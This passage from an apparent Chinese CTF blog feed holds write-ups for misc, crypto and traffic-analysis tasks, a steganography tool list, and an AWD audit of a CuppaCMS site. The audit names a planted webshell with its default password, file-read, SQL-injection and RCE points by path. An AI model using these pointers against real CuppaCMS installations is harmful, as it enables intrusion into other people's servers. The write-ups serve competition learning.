aria-hidden="true">img</figcaption></figure><p>尝试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>width,height = <span class="hljs-number">259</span>,<span class="hljs-number">518</span><br><br>im = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>, (width, height))   <span class="hljs-comment">#创建图片</span><br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;rgb.txt&#x27;</span>)    <span class="hljs-comment">#打开rbg值的文件</span><br><span class="hljs-comment">#通过每个rgb点生成图片</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, width):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, height):<br>        line = file.readline().replace(<span class="hljs-string">&#x27;(&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;)&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)  <span class="hljs-comment">#获取一行的rgb值</span><br>        rgb = line.split(<span class="hljs-string">&quot;,&quot;</span>)  <span class="hljs-comment">#分离rgb，文本中逗号后面有空格</span><br>        <span class="hljs-keyword">try</span>:<br>            im.putpixel((i, j), (<span class="hljs-built_in">int</span>(rgb[<span class="hljs-number">0</span>]), <span class="hljs-built_in">int</span>(rgb[<span class="hljs-number">1</span>]), <span class="hljs-built_in">int</span>(rgb[<span class="hljs-number">2</span>])))    <span class="hljs-comment">#将rgb转化为像素</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br>im.save(<span class="hljs-string">&quot;flag.png&quot;</span>)   <span class="hljs-comment">#im.save(&#x27;flag.jpg&#x27;)保存为jpg图片</span><br><br>img = im.transpose(Image.FLIP_LEFT_RIGHT) <br>img.save(<span class="hljs-string">&#x27;re_flag.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p>得到</p><figure><img src="/img/2023金砖CTF-决赛/170056731524210.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="data_sec">data_sec</h2><h3 id="ant_pro">Ant_Pro</h3><p>蚁剑流量</p><p>简单看了一下有10个左右的包，其中有一个是有个zip的</p><p>定位到<code>stream 30</code>，有一串hex</p><figure><img src="/img/2023金砖CTF-决赛/170056731524211.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>转一下得到蚁剑的加密器源码，可以看到key是session的前16位，<code>AES-128-ECB</code>加密</p><figure><img src="/img/2023金砖CTF-决赛/170056731524212.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>利用这些信息可以解开数据包的请求与响应包</p><figure><img src="/img/2023金砖CTF-决赛/170056731524213.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>定位到<code>stream 20</code>和<code>stream 28</code></p><p><code>stream 20</code>的http流保存为<code>jt.zip</code>（注意不要用tcp，会有多余的分块传输的字节）</p><figure><img src="/img/2023金砖CTF-决赛/170056731524214.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p><code>stream 28</code>响应解密一下</p><figure><img src="/img/2023金砖CTF-决赛/170056731524215.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><img src="/img/2023金砖CTF-决赛/170056731524316.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><img src="/img/2023金砖CTF-决赛/170056731524317.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>得到压缩包密码，解压得到<code>jt.png</code></p><p>zsteg得到flag</p><figure><img src="/img/2023金砖CTF-决赛/170056731524318.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="ezph">ezPH</h3><p>一个数据包</p><p>tcp流前15个都是这样的求离散对数问题</p><figure><img src="/img/2023金砖CTF-决赛/170056731524319.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>第16个包很大，加载慢，使用tshark导出</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tshark</span> -r ezPH.pcapng -qz follow,tcp,raw,<span class="hljs-number">15</span> &gt; <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>两次hex转处理一下得到pdf头的文件</p><figure><img src="/img/2023金砖CTF-决赛/170056731524320.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>Pohlig-Hellman算法</p><figure><img src="/img/2023金砖CTF-决赛/170056731524321.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>后面不会了，交给队友</p><h1 id="awd">AWD</h1><p>D盾扫一下</p><figure><img src="/img/2023金砖CTF-决赛/170056731524322.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="漏洞1">漏洞1</h2><p>先看<code>/var/www/html/classes/.cuppa.php</code></p><p>冰蝎马，默认密钥，密码为<code>cuppa</code></p><figure><img src="/img/2023金砖CTF-决赛/170056731524323.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><img src="/img/2023金砖CTF-决赛/170056731524324.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="漏洞2">漏洞2</h2><p><code>/var/www/html/alerts/alertConfigField.php</code></p><p>include导致的任意文件读取</p><figure><img src="/img/2023金砖CTF-决赛/170056731524325.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>漏洞验证</p><figure><img src="/img/2023金砖CTF-决赛/170056731524426.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="漏洞3">漏洞3</h2><p><code>/var/www/html/alerts/alertLightbox.php</code></p><p>include导致的任意文件读取</p><figure><img src="/img/2023金砖CTF-决赛/170056731524427.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>漏洞验证</p><figure><img src="/img/2023金砖CTF-决赛/170056731524428.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="漏洞4">漏洞4</h2><p><code>/var/www/html/components/table_manager/html/list_admin_table.php</code></p><p><code>create_function</code>的rce（有<code>$cuppa-&gt;user-&gt;valid("admin_login");</code>要登录后台）</p><figure><img src="/img/2023金砖CTF-决赛/170056731524429.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>漏洞验证：</p><p>本地环境有问题，暂时无法验证，但是漏洞是存在的</p><h2 id="漏洞5">漏洞5</h2><p><code>/var/www/html/templates/default/html/windows/right.php</code></p><p>include导致的任意文件读取</p><figure><img src="/img/2023金砖CTF-决赛/170056731524430.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>漏洞验证</p><figure><img src="/img/2023金砖CTF-决赛/170056731524431.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="漏洞6">漏洞6</h2><p><code>/var/www/html/js/filemanager/api/index.php</code></p><p>目录穿越+删除文件+任意文件重命名+copy文件任意文件读取，参考https://github.com/CuppaCMS/CuppaCMS/issues/28</p><figure><img src="/img/2023金砖CTF-决赛/170056731524432.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="漏洞7">漏洞7</h2><p><code>/var/www/html/api/index.php</code></p><p>sql注入导致rce，参考https://github.com/CuppaCMS/CuppaCMS/issues/36</p><figure><img src="/img/2023金砖CTF-决赛/170056731524433.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="漏洞8">漏洞8</h2><p><code>/var/www/html/api/generic.php</code></p><p>sql注入</p><figure><img src="/img/2023金砖CTF-决赛/170056731524434.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="漏洞9">漏洞9</h2><p><code>/var/www/html/classes/ajax/Functions.php</code></p><p><code>saveConfigData</code>函数中代码可修改<code>Configuration.php</code>可导致写入webshell，具体参考https://github.com/CuppaCMS/CuppaCMS/issues/29</p><figure><img src="/img/2023金砖CTF-决赛/170056731524435.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h1 id="总结">总结</h1><p>ctf部分还是稍微可惜了一些，多10分钟可能就能拿多几分了</p><p>awd纯没经验，被打烂了</p><p>ps：awd漏洞没有复现的要么是本地环境有问题要么是可能没有这个漏洞</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>misc</category>
      
      <category>awd</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>wp</tag>
      
      <tag>web</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023强网拟态</title>
    <link href="/2023/11/17/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/"/>
    <url>/2023/11/17/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/</url>
    
    <content type="html"><![CDATA[<h1 id="强网拟态">2023强网拟态</h1><h1 id="mimic">MIMIC</h1><h2 id="tbox-can">Tbox can</h2><p>参考 https://zhuanlan.zhihu.com/p/26394774https://blog.csdn.net/weixin_45403142/article/details/120075619</p><p>拿到一组can协议的数据包</p><p>根据网上相关文章搜索，大概了解到<code>control_field</code>给出指示后接的是<code>data_field</code>，里面是数据段</p><figure><img src="/img/2023强网拟态/17002015428102.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>根据包的特征，一次data有8个字节</p><p>先尝试将8个字节加在一起转16进制，得到<code>@DDHHLL@@DDHHLL@@DDHHLL@@DDHHLL@@DDHHLL@@DDHHLL@@DDHHLL@@DDHHLL</code>，但是错误的，单独将每一位转得到flag（脚本写的比较丑陋）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs PHP">import csv<br>csv_reader = csv.<span class="hljs-title function_ invoke__">reader</span>(<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">&quot;can_data.csv&quot;</span>))<br><br>data = <span class="hljs-string">&#x27;data_field&#x27;</span><br>data_list = []<br><span class="hljs-keyword">for</span> row in csv_reader:<br>    <span class="hljs-keyword">if</span> data in row:<br>        data_list.<span class="hljs-title function_ invoke__">append</span>(row[<span class="hljs-number">6</span>])<br><span class="hljs-comment">#print(data_list)</span><br><br><span class="hljs-comment"># 错误的尝试，将每一部分的data加起来再16进制转字符</span><br><span class="hljs-comment"># passwd_list = []</span><br><span class="hljs-comment"># for i in range(0,len(data_list)-8,8):</span><br><span class="hljs-comment">#     passwd_list.append(int(data_list[i],16)+int(data_list[i+1],16)+int(data_list[i+2],16)+int(data_list[i+3],16)+int(data_list[i+4],16)+int(data_list[i+5],16)+int(data_list[i+6],16)+int(data_list[i+7],16))</span><br><span class="hljs-comment"># print(passwd_list)</span><br><br><span class="hljs-comment"># 每一个data数据16进制转字符</span><br>passwd_list = []<br><span class="hljs-keyword">for</span> i in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">0</span>,<span class="hljs-title function_ invoke__">len</span>(data_list)):<br>    passwd_list.<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-keyword">int</span>(data_list[i],<span class="hljs-number">16</span>))<br><span class="hljs-comment">#print(passwd_list)</span><br><br>passwd = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> x in passwd_list:<br>    <span class="hljs-keyword">if</span> <span class="hljs-number">32</span>&lt;x&lt;<span class="hljs-number">125</span>:<br>        passwd += <span class="hljs-title function_ invoke__">chr</span>(x)<br><span class="hljs-keyword">print</span>(passwd)<br><span class="hljs-comment">#??FSSID:HIGDDEN_HOHTPOT8$$\`PPASS:L0QGIC_ANAR1YSIS_CSAN_FOR_TFUN??????FSSID:HIGDDEN_HOHTPOT8$$\`PPASS:L0QGIC_ANAR1YSIS_CSAN_FOR_TFUN????</span><br></code></pre></td></tr></table></figure><p>稍微修改一下得到<code>PASS:L0GIC_ANA1YSIS_CAN_FOR_FUN</code></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;L0GIC_ANA1YSIS_CAN_FOR_FUN&#125;</span><br></code></pre></td></tr></table></figure><h1 id="misc">MISC</h1><h2 id="welcome">Welcome</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ZmxhZ3tNaW1pY195eWRzJkcwZF9Kb0JfQ1RGZXJ+<span class="hljs-attribute">fQ</span>==<br></code></pre></td></tr></table></figure><p>base64：<code>flag&#123;Mimic_yyds&amp;G0d_JoB_CTFer~&#125;</code></p><h2 id="国际象棋与二维码">国际象棋与二维码</h2><p>拿到一张经过处理的类似二维码的图</p><p>题目提示：你见过国际象棋的棋盘吗</p><p>联想到与国际象棋棋盘格式的图片异或</p><p>国际棋盘格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs Plain">1 0 1 0 1 0<br>0 1 0 1 0 1<br>1 0 1 0 1 0<br>0 1 0 1 0 1<br>1 0 1 0 1 0<br>0 1 0 1 0 1<br></code></pre></td></tr></table></figure><p>这里有一个比较坑的点，给的题目格子数为49×49，但是像素是500×500的，直接用PIL库比较难处理</p><p>测试了很久得到以下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> cv2<br>att_image = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;attach.png&#x27;</span>)<br><span class="hljs-comment">#生成背景图</span><br>image = Image.new(mode=<span class="hljs-string">&#x27;RGBA&#x27;</span>, size=(<span class="hljs-number">500</span>, <span class="hljs-number">500</span>))<br><span class="hljs-comment">#image.save(&#x27;1.png&#x27;)</span><br><br>white_image = Image.new(mode=<span class="hljs-string">&#x27;RGB&#x27;</span>,size=(<span class="hljs-number">10</span>,<span class="hljs-number">10</span>) ,color=<span class="hljs-string">&#x27;white&#x27;</span>)<br>black_image = Image.new(mode=<span class="hljs-string">&#x27;RGB&#x27;</span>,size=(<span class="hljs-number">10</span>,<span class="hljs-number">10</span>) ,color=<span class="hljs-string">&#x27;black&#x27;</span>)<br><br><span class="hljs-comment">#生成500*500的国际棋盘图</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">49</span>):<br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">49</span>):<br>        <span class="hljs-keyword">if</span> (x % <span class="hljs-number">2</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> y % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>) <span class="hljs-keyword">or</span> (x % <span class="hljs-number">2</span> == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> y % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>): <span class="hljs-comment">#白色 奇数行奇数列 和 偶数行偶数列</span><br>            image.paste(white_image,(<span class="hljs-built_in">int</span>(x*(<span class="hljs-number">500</span>/<span class="hljs-number">49</span>)),<span class="hljs-built_in">int</span>(y*(<span class="hljs-number">500</span>/<span class="hljs-number">49</span>))))<br>            image.save(<span class="hljs-string">&#x27;1.png&#x27;</span>)<br>        <span class="hljs-keyword">elif</span> (x % <span class="hljs-number">2</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> y % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>) <span class="hljs-keyword">or</span> (x % <span class="hljs-number">2</span> == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> y % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>): <span class="hljs-comment">#黑色 偶数行奇数列 和 奇数行偶数列</span><br>            image.paste(black_image,(<span class="hljs-built_in">int</span>(x*(<span class="hljs-number">500</span>/<span class="hljs-number">49</span>)),<span class="hljs-built_in">int</span>(y*(<span class="hljs-number">500</span>/<span class="hljs-number">49</span>))))<br>            image.save(<span class="hljs-string">&#x27;1.png&#x27;</span>)<br><br><span class="hljs-comment">#异或</span><br>img1 = cv2.imread(<span class="hljs-string">&#x27;1.png&#x27;</span>)<br>img2 = cv2.imread(<span class="hljs-string">&#x27;attach.png&#x27;</span>)<br>xor_img = cv2.bitwise_xor(img1,img2)<br>cv2.imshow(<span class="hljs-string">&#x27;img&#x27;</span>,xor_img)<br>cv2.imwrite(<span class="hljs-string">&#x27;flag.png&#x27;</span>,xor_img)<br></code></pre></td></tr></table></figure><figure><img src="/img/2023强网拟态/17002015428001.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>再看看别人队的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment">#1</span><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>n = <span class="hljs-number">49</span><br>img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;attach.png&#x27;</span>)<br>width, height = img.size<br><br><span class="hljs-comment"># 0 -&gt; black</span><br>matrix = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">49</span>):<br>  tmp = []<br>  <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">49</span>):<br>    h = <span class="hljs-built_in">int</span>(i/<span class="hljs-number">49</span>*width+<span class="hljs-number">5</span>)<br>    w = <span class="hljs-built_in">int</span>(j/<span class="hljs-number">49</span>*height+<span class="hljs-number">5</span>)<br>    tmp += [<span class="hljs-built_in">int</span>(img.getpixel((w, h))[<span class="hljs-number">0</span>]/<span class="hljs-number">255</span>)]<br>  matrix += [tmp]<br><br>matrix2 = matrix.copy()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">49</span>):<br>  <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">49</span>):<br>    matrix2[i][j] ^= (i+j) % <span class="hljs-number">2</span><br><br>img2 = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>, (<span class="hljs-number">490</span>, <span class="hljs-number">490</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">49</span>):<br>  <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">49</span>):<br>    px = (matrix2[i][j]*<span class="hljs-number">255</span>,) * <span class="hljs-number">3</span><br>    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>      <span class="hljs-keyword">for</span> q <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        img2.putpixel((<span class="hljs-number">10</span>*i+p, <span class="hljs-number">10</span>*j+q), px)<br>img2.save(<span class="hljs-string">&#x27;qr.png&#x27;</span>)<br><br><span class="hljs-comment">#2</span><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>s=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;attach.png&#x27;</span>)<br>size=<span class="hljs-number">500</span><br>p=Image.new(<span class="hljs-string">&#x27;L&#x27;</span>,(<span class="hljs-number">49</span>,<span class="hljs-number">49</span>))<br><span class="hljs-keyword">for</span> yy <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">49</span>):<br>    <span class="hljs-keyword">for</span> xx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">49</span>):<br>        a=<span class="hljs-number">0</span><br>        b=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">if</span> s.getpixel((<span class="hljs-built_in">round</span>(<span class="hljs-number">500</span>/<span class="hljs-number">49</span>*xx+<span class="hljs-number">5</span>),<span class="hljs-built_in">round</span>(<span class="hljs-number">500</span>/<span class="hljs-number">49</span>*yy+<span class="hljs-number">5</span>)))[<span class="hljs-number">2</span>]&gt;<span class="hljs-number">128</span> :<br>            a=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> (xx+yy)%<span class="hljs-number">2</span>==<span class="hljs-number">1</span>:<br>            b=<span class="hljs-number">1</span><br>        p.putpixel((xx,yy),(a^b)*<span class="hljs-number">255</span>)<br>p.save(<span class="hljs-string">&#x27;out.png&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="crypto">CRYPTO</h1><h2 id="一眼看出">一眼看出</h2><p>p、q都相当于直接给了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>n = <span class="hljs-number">121027298948349995679677982412648544403333177260975245569073983061538581058440163574922807151182889153495253964764966037308461724272151584478723275142858008261257709817963330011376266261119767294949088397671360123321149414700981035517299807126625758046100840667081332434968770862731073693976604061597575813313</span><br>r = getPrime(<span class="hljs-number">6</span>)<br>e = <span class="hljs-number">65537</span><br>a = <span class="hljs-number">11001240791308496565411773845509754352597481464288272699325231395472137144610774645372812149675141360600469640492874223541765389441131365669731006263464699</span><br>c = <span class="hljs-number">42256117129723577554705402387775886393426604555611637074394963219097781224776058009003521565944180241032100329456702310737369381890041336312084091995865560402681403775751012856436207938771611177592600423563671217656908392901713661029126149486651409531213711103407037959788587839729511719756709763927616470267</span><br>p = gmpy2.next_prime(a - r)<br>q = gmpy2.next_prime(gmpy2.next_prime(a) + r)<br><br>phi_n = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = gmpy2.invert(e,phi_n)<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>misc</category>
      
      <category>crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>wp</tag>
      
      <tag>crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>misc工具使用</title>
    <link href="/2023/11/06/misc%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    <url>/2023/11/06/misc%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="misc工具使用">MISC工具使用</h1><h2 id="隐写">隐写</h2><h3 id="puzzlesolver">PuzzleSolver</h3><p>byxs20师傅的工具，综合利用工具，包括盲水印、fix_png、</p><h3 id="stegsolve"><strong>stegsolve</strong></h3><p>常用的lsb隐写工具，图形化</p><h3 id="ciphey">Ciphey</h3><p>带ai的自动解密工具 https://github.com/Ciphey/Ciphey<code>python3 -m pip install ciphey --upgrade</code></p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">ciphey -<span class="hljs-built_in">t</span> <span class="hljs-string">&quot;encode message&quot;</span><br></code></pre></td></tr></table></figure><h3 id="gaps">gaps</h3><p>gap拼接图片</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">gaps --image=a.png --size=100 --save<br></code></pre></td></tr></table></figure><h3 id="steghide">steghide</h3><p>查看音频/图片文件隐藏内容，jpg、png、wav</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">steghide extract -sf 1.jpg -p password<br></code></pre></td></tr></table></figure><h3 id="stegseek">stegseek</h3><p>爆破steghide</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">stegseek 1.jpg<br></code></pre></td></tr></table></figure><h3 id="montage">montage</h3><p>拼接多个图片变成一个图片</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">montage *.jpg -tile 8X6 -geometry +0+0 1.jpg   <br></code></pre></td></tr></table></figure><h3 id="outguess">Outguess</h3><p>outguess隐写，jpg，密码可以为空</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">outguess -k <span class="hljs-string">&#x27;password&#x27;</span> -r 2.jpg -t 1.txt<br></code></pre></td></tr></table></figure><h3 id="qr_research">QR_Research</h3><p>二维码扫描工具，图形化界面，最高30%纠错率</p><h3 id="qrscan">QrScan</h3><p>批量识别二维码</p><p>https://github.com/zfb132/QrScan</p><h3 id="f5-steganography">F5-steganography</h3><p>F5隐写，jpg、gif、bmp，密码可以为空 git clonehttps://github.com/matthewgao/F5-steganography</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">java Extract xx.jpg -p <span class="hljs-string">&#x27;password&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="jphswin"><strong>Jphswin</strong></h3><p>对有损压缩JPEG文件进行信息的加密隐藏、探测提取的工具，图形化</p><h3 id="zsteg"><strong>zsteg</strong></h3><p>基于Ruby编写的图片隐写分析工具，kali下使用比较方便</p><p><code>gem install zsteg</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#查看所有通道的隐写</span><br><span class="hljs-attribute">zsteg</span> <span class="hljs-number">1</span>.png --<span class="hljs-literal">all</span><br><span class="hljs-comment">#导出某一通道</span><br><span class="hljs-attribute">zsteg</span> -E extradata:<span class="hljs-number">0</span> green.png &gt; flag.zip<br></code></pre></td></tr></table></figure><h3 id="stegdetect">stegdetect</h3><p>检测jpg隐写工具，有时候不太准https://blog.csdn.net/qq_53079406/article/details/124596878</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">.\stegdetect.exe -tjopi -s 10.0 1.jpg<br></code></pre></td></tr></table></figure><h3 